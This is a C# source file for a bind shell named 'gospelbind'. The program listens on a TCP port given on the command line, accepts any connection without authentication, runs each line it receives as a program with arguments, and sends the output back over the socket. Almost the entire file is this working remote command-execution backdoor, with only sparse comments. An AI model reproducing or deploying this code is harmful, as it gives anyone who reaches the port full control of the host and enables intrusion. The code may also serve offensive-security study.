//
//
//
//
//





using System;
using System.Net.Sockets;
using System.Net;// public class TCPListener
using System.Linq;
using System.IO;
using System.Text;
using System.Diagnostics;

namespace gospelbind
{
	class MainClass
	{
		public static void Main (string[] args)
		{
			int lport = int.Parse (args [0]);
			TcpListener listnr = new TcpListener (IPAddress.Any, lport);

			while (true) {

				try {
					listnr.Start ();
				} catch {
					return;
				}
				// TCPListener\\ public class TcpListener-Listens for connections from TCP network clients.
				using (Socket socket = listnr.AcceptSocket ()) {
					using (NetworkStream stream = new NetworkStream (socket)) {
						using (StreamReader read = new StreamReader (stream)) {
							while (true) {
								string cmdexe = read.ReadLine ();

								if (string.IsNullOrEmpty (cmdexe)) {
									read.Close ();
									stream.Close ();
									listnr.Stop ();
									return;
								}

								if (string.IsNullOrWhiteSpace (cmdexe))
									continue;

								string[] split = cmdexe.Trim().Split(' ');
								string filename = split.First();
								string arg = string.Join (" ", split.Skip(1));
								//4-7 Reading command from  network stream and  splitting the command from the arguments
								try {
									Process proc = new Process ();
									proc.StartInfo = new ProcessStartInfo();
									proc.StartInfo.FileName = filename;
									proc.StartInfo.Arguments = arg;
									proc.StartInfo.UseShellExecute = false;
									proc.StartInfo.RedirectStandardOutput=true;
									proc.Start ();
									proc.StandardOutput.BaseStream.CopyTo (stream);
									proc.WaitForExit ();
								} catch {
									string UBAD = "Hm..Something Isn't right here..." + cmdexe + "\n";
									byte[] errorBytes = Encoding.ASCII.GetBytes (UBAD);
									stream.Write (errorBytes, 0, errorBytes.Length);
								}
							}
						}
					}
				}
			}
		}
	}
}
